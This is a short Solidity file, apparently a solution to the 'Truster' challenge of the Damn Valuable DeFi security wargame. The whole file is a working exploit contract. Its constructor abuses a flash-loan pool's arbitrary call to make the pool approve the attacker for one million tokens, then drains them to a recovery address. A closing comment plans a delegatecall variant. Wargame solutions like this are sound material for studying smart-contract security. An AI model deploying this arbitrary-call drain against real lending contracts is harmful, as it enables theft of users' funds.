// SPDX-License-Identifier: MIT

pragma solidity =0.8.25;

import {TrusterLenderPool} from "./TrusterLenderPool.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";

contract Attacker {
    constructor(
        TrusterLenderPool _pool,
        DamnValuableToken _token,
        address _recovery
    ) {
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            1_000_000e18
        );
        _pool.flashLoan(0, address(this), address(_token), data);
        _token.transferFrom(address(_pool), _recovery, 1_000_000e18);
    }
}

// Will also try soon using the delegatecall method